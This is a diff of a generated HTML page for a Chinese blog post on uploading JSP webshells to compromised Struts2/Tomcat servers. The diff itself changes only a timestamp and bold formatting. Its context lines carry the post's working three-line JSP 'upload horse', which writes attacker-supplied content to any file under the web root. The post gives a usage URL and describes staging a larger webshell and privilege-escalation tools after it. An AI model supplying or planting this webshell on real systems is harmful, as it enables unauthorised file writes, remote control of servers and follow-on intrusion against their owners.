@@ -19,7 +19,7 @@
 <meta property="og:image" content="http://yoursite.com/img/struts2/2.jpg">
 <meta property="og:image" content="http://yoursite.com/img/struts2/4.jpg">
 <meta property="og:image" content="http://yoursite.com/img/struts2/3.jpg">
-<meta property="og:updated_time" content="2018-02-05T03:35:47.142Z">
+<meta property="og:updated_time" content="2018-02-05T03:38:23.826Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="JSP小马上传">
 <meta name="twitter:description" content="传统小马只支持上传大马等文本文件,我们一般都是先把大马传到服务器,然后再上传cmd.exe或pr.exe等等其它相关提权工具,又或者直接上传木马.但是有时候,我们根本就无法上传WebShell大马,或者说传过去功能爆废了.特别是Struts2环境,大家应该深有感悟。碰到好多,只能传那个普通的一句话小马，但是要传个大马啥的,基本上全都废了。  基本信息获取">
@@ -182,7 +182,7 @@
         <blockquote>
 <p>传统小马只支持上传大马等文本文件,我们一般都是先把大马传到服务器,<br>然后再上传cmd.exe或pr.exe等等其它相关提权工具,又或者直接上传木马.<br>但是有时候,我们根本就无法上传WebShell大马,或者说传过去功能爆废了.<br>特别是Struts2环境,大家应该深有感悟。碰到好多,只能传那个普通的一句话小马，但是要传个大马啥的,基本上全都废了。</p>
 </blockquote>
-<h2 id="基本信息获取"><a href="#基本信息获取" class="headerlink" title="基本信息获取"></a>基本信息获取</h2><p><img src="/img/struts2/1.png" alt="“s”"><br><a id="more"></a><br><strong>webpath：<code>D:\tomcat7\webapps\cms\</code> 就是网站更目录</strong><br><strong>遇到直接上传<code>jsp菜刀连接马``jsp大马</code>上传失败的时候</strong><br>__这时候我们可以先上传一个<code>jsp上传马</code> 然后再上传jsp大马<br><img src="/img/struts2/1.jpg" alt="“s”"> </p>
+<h2 id="基本信息获取"><a href="#基本信息获取" class="headerlink" title="基本信息获取"></a>基本信息获取</h2><p><img src="/img/struts2/1.png" alt="“s”"><br><a id="more"></a><br><strong>webpath：<code>D:\tomcat7\webapps\cms\</code> 就是网站更目录</strong><br><strong>遇到直接上传<code>jsp菜刀连接马``jsp大马</code>上传失败的时候</strong><br><strong>这时候我们可以先上传一个<code>jsp上传马</code> 然后再上传jsp大马</strong><br><img src="/img/struts2/1.jpg" alt="“s”"> </p>
 <p><strong>在没上传shell成功之前，可以使用<code>tree /f</code>命令来看目录结构</strong></p>
 <h2 id="上传马"><a href="#上传马" class="headerlink" title="上传马"></a>上传马</h2><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;%  </span><br><span class="line"><span class="keyword">if</span>(request.getParameter(<span class="string">"f"</span>)!=<span class="keyword">null</span>)(<span class="keyword">new</span> java.io.FileOutputStream(application.getRealPath(<span class="string">"\")+request.getParameter("</span>f<span class="string">"))).write(request.getParameter("</span>t<span class="string">").getBytes());  </span></span><br><span class="line"><span class="string">%&gt;</span></span><br></pre></td></tr></table></figure>
 <p><strong><br>使用方法：<code>http://localhost/shangchuanma.jsp?f=dama.jsp&amp;t=hello</code><br>然后:在更目录下生成一个dama.jsp文件，内容为 hello …..<br>原理就是使用get传递代码在根目录生成文件</strong></p>
